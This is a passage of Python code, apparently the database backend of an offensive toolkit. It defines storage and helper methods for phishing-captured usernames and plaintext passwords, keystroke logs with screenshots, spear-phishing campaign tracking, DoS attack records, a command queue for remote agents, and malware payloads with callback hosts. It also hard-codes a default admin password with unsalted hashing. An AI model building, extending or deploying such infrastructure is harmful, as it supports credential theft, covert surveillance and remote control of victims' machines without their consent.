                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            # Scans
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Users
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Sessions
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            # Keylogs
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            # Spear Phishing Campaigns
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            # Email Tracking
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            # DOS Attacks
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Agents
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            # Agent Commands
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            # Network Packets
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            # Performance Metrics
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            # Deployments
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            # Clipboard History
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            # DNS Cache
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            # Docker Scans
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Cracking Jobs
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            # Reverse Engineering Jobs
            """
            CREATE TABLE IF NOT EXISTS reverse_engineering_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                file_path TEXT NOT NULL,
                analysis_type TEXT NOT NULL,
                result TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                completed_at DATETIME,
                success BOOLEAN DEFAULT 1
            )
            """,
            # NAT Info
            """
            CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Platform Commands
            """
            CREATE TABLE IF NOT EXISTS platform_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                command TEXT NOT NULL,
                user_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed BOOLEAN DEFAULT 0,
                result TEXT
            )
            """,
            # Email Messages
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # PDF Reports
            """
            CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )
            """,
            # Threat Monitors
            """
            CREATE TABLE IF NOT EXISTS threat_monitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                interval INTEGER DEFAULT 300,
                enabled BOOLEAN DEFAULT 1,
                last_scan DATETIME,
                next_scan DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Threat Monitor Results
            """
            CREATE TABLE IF NOT EXISTS threat_monitor_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                monitor_id INTEGER,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threats_found INTEGER DEFAULT 0,
                severity TEXT,
                output TEXT,
                FOREIGN KEY (monitor_id) REFERENCES threat_monitors(id)
            )
            """,
            # Tenants (SaaS)
            """
            CREATE TABLE IF NOT EXISTS tenants (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                email TEXT NOT NULL,
                tier TEXT DEFAULT 'free',
                api_key TEXT UNIQUE,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                max_scans INTEGER DEFAULT 10,
                scans_used INTEGER DEFAULT 0,
                max_targets INTEGER DEFAULT 5,
                targets_count INTEGER DEFAULT 0,
                features TEXT
            )
            """,
            # API Keys (SaaS)
            """
            CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                tenant_id TEXT NOT NULL,
                name TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                active BOOLEAN DEFAULT 1,
                permissions TEXT,
                rate_limit INTEGER DEFAULT 1000,
                requests_used INTEGER DEFAULT 0,
                FOREIGN KEY (tenant_id) REFERENCES tenants(id)
            )
            """,
            # Billing Records (SaaS)
            """
            CREATE TABLE IF NOT EXISTS billing_records (
                id TEXT PRIMARY KEY,
                tenant_id TEXT NOT NULL,
                amount REAL,
                currency TEXT DEFAULT 'USD',
                description TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                paid_at DATETIME,
                FOREIGN KEY (tenant_id) REFERENCES tenants(id)
            )
            """,
            # Nmap Scan Results
            """
            CREATE TABLE IF NOT EXISTS nmap_scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_options TEXT,
                output TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Curl History
            """
            CREATE TABLE IF NOT EXISTS curl_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                url TEXT NOT NULL,
                method TEXT,
                status_code INTEGER,
                response_size INTEGER,
                execution_time REAL
            )
            """,
            # Wget History
            """
            CREATE TABLE IF NOT EXISTS wget_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                url TEXT NOT NULL,
                output_file TEXT,
                status_code INTEGER,
                file_size INTEGER,
                execution_time REAL
            )
            """,
            # Metasploit Sessions
            """
            CREATE TABLE IF NOT EXISTS metasploit_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                target_host TEXT,
                target_port INTEGER,
                exploit_used TEXT,
                payload_used TEXT,
                status TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Malware Payloads
            """
            CREATE TABLE IF NOT EXISTS malware_payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                malware_type TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                callback_host TEXT,
                callback_port INTEGER,
                executed BOOLEAN DEFAULT 0,
                execution_time DATETIME
            )
            """,
            # Image Payloads
            """
            CREATE TABLE IF NOT EXISTS image_payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                image_path TEXT NOT NULL,
                payload_path TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0
            )
            """,
            # Custom Phishing Templates
            """
            CREATE TABLE IF NOT EXISTS custom_templates (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        """Create default admin user if not exists"""
        try:
            default_password = "ghost_crab_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        """Log a command execution"""
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log a threat detection"""
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        """Add an IP to managed IPs"""
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP in the database"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock an IP in the database"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get all managed IPs"""
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        """Add a domain host"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        """Get all domain hosts"""
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        """Resolve a domain to IP"""
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        """Resolve an IP to domain"""
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        """Add an SSH connection"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        """Log an SSH command execution"""
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        """Log a traffic generation"""
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        """Log a Nikto scan"""
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save a phishing link"""
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get all phishing links"""
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        """Save a captured credential"""
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        """Get system statistics"""
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_re_jobs'] = self.conn.execute("SELECT COUNT(*) FROM reverse_engineering_jobs").fetchone()[0]
            stats['total_tenants'] = self.conn.execute("SELECT COUNT(*) FROM tenants").fetchone()[0]
            stats['total_nmap_scans'] = self.conn.execute("SELECT COUNT(*) FROM nmap_scan_results").fetchone()[0]
            stats['total_curl_requests'] = self.conn.execute("SELECT COUNT(*) FROM curl_history").fetchone()[0]
            stats['total_wget_requests'] = self.conn.execute("SELECT COUNT(*) FROM wget_history").fetchone()[0]
            stats['total_msf_sessions'] = self.conn.execute("SELECT COUNT(*) FROM metasploit_sessions").fetchone()[0]
            stats['total_malware_payloads'] = self.conn.execute("SELECT COUNT(*) FROM malware_payloads").fetchone()[0]
            stats['total_image_payloads'] = self.conn.execute("SELECT COUNT(*) FROM image_payloads").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        """Verify a user's credentials"""
        try:
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        """Create a session"""
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.now() + timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        """Verify a session"""
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        """Save a keylog entry"""
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        """Get keylog entries"""
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        """Save a spear phishing campaign"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        """Get all spear phishing campaigns"""
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        """Track an email open"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        """Track an email click"""
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        """Log a DOS attack"""
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        """Get DOS attacks"""
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        """Register an agent"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        """Update an agent heartbeat"""
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        """Add a command for an agent"""
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        """Get pending commands for an agent"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        """Update an agent command result"""
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        """Get all agents"""
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        """Get an agent by ID"""
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        """Save a network packet"""
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
